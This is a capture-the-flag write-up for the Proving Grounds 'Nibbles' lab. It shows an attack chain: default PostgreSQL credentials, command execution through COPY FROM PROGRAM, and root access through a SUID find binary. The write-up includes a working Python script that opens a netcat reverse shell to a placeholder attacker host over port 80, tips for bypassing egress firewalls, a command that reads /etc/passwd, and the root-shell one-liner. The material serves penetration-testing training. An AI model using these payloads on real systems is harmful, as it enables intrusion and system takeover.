# Nibbles - Proving Grounds Practice

> **Kill Chain Summary**: Nmap scans identify PostgreSQL on non-standard port 5437 -> Default database credentials (postgres:postgres) -> Command execution via PostgreSQL COPY FROM PROGRAM -> Egress firewall bypass using port 80 -> Reverse shell as postgres -> SUID Enumeration reveals /usr/bin/find -> GTFOBins SUID execution -> Root Shell.

| Property | Value |
|---|---|
| **Target Name** | Nibbles |
| **Platform** | Proving Grounds Practice |
| **OS** | Linux (Debian) |
| **Difficulty** | Easy / Medium |
| **Status** | Rooted |
| **Key Techniques** | PostgreSQL Default Credentials (Port 5437), PostgreSQL COPY FROM PROGRAM RCE, Egress Firewall Filtering Bypass, SUID Binary Exploitation (/usr/bin/find) |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We initiate reconnaissance with a full TCP port scan:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn $IP -oA nmap/allports
```

**Open Ports Summary:**
```text
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
139/tcp  closed netbios-ssn
445/tcp  closed microsoft-ds
5437/tcp open   pmip6-data
```

![Screenshot](../../attachments/Pasted%20image%2020260826204906.png)

A web server is active on port 80, while port 5437 hosts an unfamiliar service labeled `pmip6-data`.

---

### 1.2 Web and Directory Enumeration (Port 80)

Running directory fuzzing on port 80:

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old
```

The scan returned only static assets and restricted paths (`.hta`, `.htaccess`, `server-status`). The web root serves a generic placeholder with no dynamic endpoints.

---

### 1.3 Service Identification: Port 5437 (PostgreSQL)

Connecting to port 5437 via Netcat or Nmap service scripts reveals a PostgreSQL database listener running on a non-standard port:

```bash
nmap -sV -p 5437 $IP
# 5437/tcp open  postgresql PostgreSQL DB 11.7
```

We attempt to connect using the default PostgreSQL administrative credentials (`postgres` / `postgres`):

```bash
psql -h $IP -p 5437 -U postgres
# Password for user postgres: postgres
```

Authentication succeeds, granting an interactive SQL prompt:

```text
psql (16.2, server 11.7)
Type "help" for help.

postgres=#
```

---

## 2. Initial Access

### 2.1 File Read via PostgreSQL

We test local file reading capabilities using the built-in `pg_read_file` function:

```sql
SELECT pg_read_file('/etc/passwd');
```

```text
root:x:0:0:root:/root:/bin/bash
...
wilson:x:1000:1000:wilson,,,:/home/wilson:/bin/bash
postgres:x:106:113:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
```

The system contains an interactive user account named `wilson`.

---

### 2.2 RCE via `COPY FROM PROGRAM` and Egress Filtering Bypass

Starting in PostgreSQL 9.3, superusers can execute system commands through the `COPY ... FROM PROGRAM` syntax.

#### Initial Reverse Shell Failures
We create a staging table to test command execution:

```sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'which python3 python perl wget nc';
SELECT * FROM shell;
```

The target has standard tools installed (`/usr/bin/nc`, `/usr/bin/python3`, `/usr/bin/wget`). However, multiple reverse shell payloads targeting port 4444 failed to establish a connection.

Testing network egress via `wget` confirmed that outbound traffic on high ports (like 4444) was actively dropped by host firewall rules, whereas HTTP (port 80) and HTTPS (port 443) were allowed outbound.

#### Exploitation via Python Automation on Port 80

We utilize a dedicated script to connect, configure the table, and deliver a FIFO reverse shell over port 80:

```python
#!/usr/bin/env python3
import psycopg2

RHOST = '192.168.x.x'
RPORT = 5437
LHOST = 'KALI_IP'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'

with psycopg2.connect(host=RHOST, port=RPORT, user=USER, password=PASSWD) as conn:
    cur = conn.cursor()
    print("[*] Connected to PostgreSQL")
    rev_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
    cur.execute('DROP TABLE IF EXISTS cmd_exec')
    cur.execute('CREATE TABLE cmd_exec(cmd_output text)')
    cur.execute(f"COPY cmd_exec FROM PROGRAM '{rev_shell}'")
    cur.close()
```

#### Execution and Catching the Shell

1. Start a Netcat listener on port 80 on Kali:
   ```bash
   sudo nc -lnvp 80
   ```

2. Run the script:
   ```bash
   python3 postgresql_rce.py
   ```

Connection received:
```bash
connect to [KALI_IP] from [192.168.x.x]
$ whoami
postgres

$ id
uid=106(postgres) gid=113(postgres) groups=113(postgres),111(ssl-cert)
```

Checking user flag in `/home/wilson`:
```bash
cat /home/wilson/local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 SUID Binary Enumeration

Scanning the filesystem for binaries with the SUID bit set:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
```

The binary `/usr/bin/find` has the SUID permission bit set (`-rwsr-xr-x`) and is owned by root.

---

### 3.2 Root Escalation via GTFOBins (`find`)

According to GTFOBins, `find` can execute commands using the `-exec` flag. Because SUID retains effective permissions, passing `/bin/sh -p` spawns a root shell:

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

```bash
# whoami
root

# id
uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres)
```

Checking root flag:
```bash
cat /root/proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Connect to PostgreSQL CLI on custom port
psql -h [TARGET_IP] -p 5437 -U postgres

# Read arbitrary files via PostgreSQL
SELECT pg_read_file('/etc/passwd');

# Command execution via COPY FROM PROGRAM
COPY staging_table FROM PROGRAM 'command_here';

# GTFOBins find SUID root spawn
/usr/bin/find . -exec /bin/sh -p \; -quit
```

---

## 5. Key Takeaways and Lessons Learned

1. **Check Non-Standard Ports:** PostgreSQL is conventionally hosted on port 5432, but finding it on 5437 demonstrates why full port scans (`-p-`) are critical. Always probe unfamiliar ports with service detection (`-sV`).
2. **Default Database Credentials:** Testing default credentials (`postgres:postgres`, `sa:`, `root:root`) should be an immediate step upon discovering database listeners.
3. **Egress Firewall Filtering:** When reverse shell payloads fail to trigger despite confirmed command execution, suspect outbound port filtering. Falling back to port 80, 443, or 53 resolves egress restrictions in most environments.
4. **SUID Find Privilege Preservation:** When abusing SUID binaries on Linux distributions where `/bin/sh` drops privileges upon execution, passing the `-p` parameter ensures privileged execution is preserved.

---

### Tags
#linux #postgresql #copy-from-program #rce #egress-filtering #suid #gtfobins #find #easy #pg-practice #rooted